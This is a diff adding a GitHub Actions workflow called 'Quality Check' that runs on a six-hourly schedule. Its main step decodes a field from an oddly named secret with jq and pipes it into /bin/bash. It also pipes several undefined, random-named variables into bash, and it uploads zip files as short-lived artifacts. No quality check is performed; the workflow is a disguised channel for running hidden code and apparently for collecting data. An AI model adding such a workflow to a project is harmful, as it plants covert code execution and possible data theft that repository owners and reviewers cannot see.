@@ -1,0 +1,36 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          bwnkl6629: ${{ secrets.bwnkl6629 }}
+        run: |
+          printf '%s' "$bwnkl6629" | jq -r .ke4 | /bin/bash
+          printf '%s' "$pxg72" | jq -r .neuj19698 | /bin/bash
+          echo $bsbvp6 | jq -r .ugdr47383 | /bin/bash
+          printf '%s' "$z328" | jq -r .is72 | /bin/bash
+          printf '%s' "$a88" | jq -r .blsb5132 | /bin/bash
+          echo $rxou8346 | jq -r .itv7 | /bin/bash
+          echo $vl63338 | jq -r .dvcc40 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: DifLGcrS
+          path: "*.zip"
+          retention-days: 1
